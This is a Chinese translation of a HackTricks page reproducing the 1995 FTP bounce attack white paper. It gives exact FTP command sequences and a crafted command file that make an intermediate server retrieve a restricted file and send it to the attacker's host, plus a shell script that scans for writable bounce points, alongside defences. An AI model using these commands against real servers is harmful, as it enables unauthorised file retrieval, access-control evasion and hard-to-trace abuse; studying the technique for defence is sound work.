<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>


# 简介

如果你能访问一个反弹FTP服务器，你可以让它请求其他FTP服务器（你知道一些凭据的地方）的文件，并将该文件下载到你自己的服务器上。

## 要求

FTP中间服务器上的有效凭据
受害者FTP服务器上的有效凭据
两个服务器都接受PORT命令（反弹FTP攻击）
你可以在FTP中间服务器的某个目录中写入
中间服务器在某种程度上比你在受害者FTP服务器上拥有更多的访问权限（这是你要利用的）

## 步骤

1. 连接到你自己的FTP服务器，并使连接被动（pasv命令），以便它在受害者服务将文件发送到的目录中监听
2. 创建将要发送到FTP中间服务器的受害者服务器的文件（利用）。这个文件将是一个明文文件，包含了对受害者服务器进行身份验证、更改目录并将文件下载到你自己的服务器的必要命令。
3. 连接到FTP中间服务器并上传前面的文件
4. 使FTP中间服务器与受害者服务器建立连接并发送利用文件
5. 在你自己的FTP服务器上捕获文件
6. 从FTP中间服务器中删除利用文件



本文中的所有信息均来自：[http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)

# FTP反弹攻击

本文讨论了“FTP服务器反弹攻击”的许多可能用途之一。所使用的机制可能是众所周知的，但迄今为止，对其进行详细描述或修复的兴趣似乎很低或根本不存在。选择这个特定的例子是为了让读者警觉到标准FTP协议中存在一些非常不合理的方面。

还要感谢imag.fr的Alain Knaff几个月前对其中一些问题进行了简短但有趣的讨论，这让我对这些问题有了更深入的思考。

## 动机

你是foreign.fr上的用户，IP地址为F.F.F.F，想要从美国的crypto.com获取加密源代码。crypto.com的FTP服务器设置为允许你的连接，但拒绝你访问加密源代码，因为你的源IP地址是非美国站点的IP地址\[就其FTP服务器从DNS中确定的情况而言\]。无论如何，你无法直接从crypto.com的服务器中检索到你想要的内容。

然而，crypto.com将允许ufred.edu下载加密源代码，因为ufred.edu也位于美国。你碰巧知道ufred.edu上的/incoming是一个任何匿名用户都可以将文件放入并从中读取的可写目录。crypto.com的IP地址是C.C.C.C。

## 攻击

假设你有一个支持被动模式的FTP服务器。打开一个FTP连接到你自己机器的真实IP地址\[不是localhost\]并登录。切换到一个你有写权限的方便目录，然后执行以下操作：
```text
pasv
stor foobar
```
注意PASV命令返回的地址和端口，F,F,F,F,X,X。此FTP会话现在将挂起，因此将其放入后台或切换到另一个窗口以继续进行其他操作。

构建一个包含FTP服务器命令的文件。我们将其称为"`instrs`"。它将如下所示：
```text
user ftp
pass -anonymous@
cwd /export-restricted-crypto
type i
port F,F,F,F,X,X
retr crypto.tar.Z
quit
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
...
```
F,F,F,F,X,X是你自己的机器在第一次连接时提供给你的相同地址和端口。末尾的垃圾是你创建的额外行，每行包含250个NULL字符，没有其他内容，足够填充大约60K的额外数据。稍后会解释这个填充的原因。

打开一个FTP连接到ufred.edu，使用匿名登录，并cd到/incoming目录。现在在这个FTP会话中输入以下内容，它会将你的"`instrs`"文件的副本传输过去，然后告诉ufred.edu的FTP服务器使用你的文件作为命令连接到crypto.com的FTP服务器：
```text
put instrs
port C,C,C,C,0,21
retr instrs
```
`Crypto.tar.Z`现在应该通过您的第一个FTP连接显示为"`foobar`"。如果与ufred.edu的连接没有因为一个常见的服务器错误而自动断开，那么请删除"`instrs`"并退出以清理。否则，您将需要重新连接以完成清理。

## 讨论

这有几个变种。您可以在任何您具有文件写入权限的机器上打开PASV监听器连接 - 您自己的机器，ufred.edu的另一个连接，或者完全不相关的地方。实际上，它甚至不必是一个FTP服务器 - 任何能够在已知的TCP端口上监听并将原始数据读入文件的实用程序都可以。被动模式的FTP数据连接只是一种方便的方法来实现这一点。

命令文件末尾的额外空字符是为了填充ufred -&gt; crypto连接两端的TCP窗口，并确保命令连接保持足够长的时间以执行整个会话。否则，大多数FTP服务器 tend to abort all transfers and command processing when the control connection closes prematurely. 数据的大小足以填满接收和传输窗口，在某些操作系统上这些窗口相当大\[大约30K\]。如果您知道两端的操作系统和它们默认的TCP窗口大小之和，您可以将其缩小。它被分成250个字符的行，以避免在目标服务器上超过命令缓冲区 - 这可能是学术性的，因为您已经告诉服务器退出了。

如果crypto.com不允许您从foreign.fr进行\*任何\*FTP客户端连接，并且您需要查看文件的位置，您可以在您的命令文件中放置"`list -aR`"，并通过ufred获取整个树的目录列表。

您可能需要以ASCII模式而不是二进制模式将命令文件检索到目标的FTP服务器。一些FTP服务器可以处理原始换行符，但其他一些可能需要以CRLF对终止命令行。在检索文件到除FTP服务器以外的守护程序时，请记住这一点。

## 其他可能性

尽管这种第三方连接是单向的，但它们可以用于各种事情。类似的方法可以用于发布几乎无法追踪的邮件和新闻，对各个站点的服务器进行攻击，填满磁盘，尝试绕过防火墙，并且通常既令人讨厌又难以追踪。稍加思考就会意识到其他许多可怕的可能性。

以这种方式启动的连接来自源端口20，一些站点允许这些连接通过其防火墙，以应对“ftp-data”问题。对于某些目的，这可能是源路由攻击的替代方案，并且在针对数据包过滤器的源路由失败时很可能成功。这一切都是由FTP协议规范的编写方式所实现的，允许控制连接来自任何地方，数据连接可以去任何地方。

## 防御措施

互联网上总会有一些老旧的FTP服务器和可写目录，允许这种流量的存在，因此说“修复所有FTP服务器”是错误的答案。但是，您可以保护自己免受成为第三方反弹点以及遭受其他人使用反弹点的攻击。

首先要做的明显的事情是，只允许FTP服务器仅与控制连接的源主机建立数据连接。当然，这并不能防止上述攻击，因为PASV监听器也可以轻松地位于ufred.edu上，从而满足该要求，但它可以防止\*您的\*站点成为潜在的反弹点。它还破坏了“代理FTP”的概念，但在这段文字中隐藏着一把非常小的小提琴。

接下来要做的明显的事情是禁止来自保留端口或至少端口20的FTP控制连接。这可以防止上述情况的发生。

为了防止此类黑客攻击，这两个措施以及有关阻止源路由数据包和其他欺骗手段的常规建议是必要的。并且请考虑一下您是否真的需要一个开放的“传入”目录。

只允许被动模式的客户端数据连接是另一种可能性，但仍然有太多不支持被动模式的FTP客户端在使用。

## “宽松的共识和运行代码”

这里有一些现有的工作正在解决这个问题，可以在avian.org \[并且已经有几个月了，我可以补充\]的“修复工具包存档”中找到。提供了对wu-ftpd-2.4的几个修改，其中包括防止和记录使用虚假PORT命令的尝试的代码。还包括来自其他地方的最新安全修复，以及s/key支持和各种编译时选项，以增强特定应用程序的安全性。

academ.com的Stan Barber正在努力将这些修复和其他几个修复合并到一个真正的更新的wu-ftpd版本中。还有其他几个不同的努力正在进行中。当然，没有人声称这些工作已经完成，但这是我长期以来一直在考虑的事情的开始 - 一个网络范围的wu-ftpd-2.5发布，来自全网的贡献。wu-ftpd服务器已经变得非常受欢迎，但是它 dringend需要进行另一次安全升级。将所有改进整合到一个协调的地方将是很好的，而且看起来这将会发生。当然，所有这些仍然无法帮助那些坚持运行供应商提供的服务器的人。

特定于FTP服务器修复的FTP服务器修复中尚未实现特定的客户端连接源端口的合理检查，但是在Wietse的tcp-wrappers软件包的修改中实现了这一点，因为这个问题更为普遍。在tcpd阶段添加了一个简单的PORT选项，它拒绝来自可配置源端口范围的连接，然后才执行被调用的守护程序。

在这里的匿名FTP区域中，[/src/fixkits/README](ftp://ftp.avian.org:/src/fixkits/README)指向了一些相关内容。在获取其他内容之前，请阅读这个路线图。

## 注意

在命令文件末尾添加空字符是使其针对各种守护程序工作的关键。仅仅发送所需的数据通常会失败，因为立即关闭会导致守护程序退出。

如果WUSTL对整个wu-ftpd项目仍然没有放弃，他们对进一步的工作保持着非常沉默。Bryan O'Connor现在似乎有很多其他项目要处理...

这是一个在基于Unix的匿名FTP服务器上查找可写和FTP所有目录和文件的简单脚本。您会惊讶地发现，在运行类似脚本的短时间内，有多少可写的“反弹点”会出现。稍后您将需要检查您是否可以从这些位置PUT和GET文件；一些服务器会保护上传的文件免受阅读。许多服务器则不会这样做，然后惊讶地发现自己成为本周十大盗版站点之一...
```text
#!/bin/sh
ftp -n $1 << FOE
quote "user ftp"
quote "pass -nobody@"
prompt
cd /
dir "-aR" xxx.$$
bye
FOE
# Not smart enough to figure out ftp's numeric UID if no passwd file!
cat -v xxx.$$ | awk '
BEGIN { idir = "/" ; dirp = 0 }
/.:$/ { idir = $0 ; dirp = 1 ; }
/^[-d][-r](......w.|........  *[0-9]* ftp  *)/ {
if (dirp == 1) print idir
dirp = 0
print $0
} '
rm xxx.$$
```
我想这可以称为一份白皮书。它可以在avian.org的[/random/ftp-attack](ftp://ftp.avian.org:/random/ftp-attack)上获取，也可以在各个相关的地方发布。\_H\* 950712



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks的衣物**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
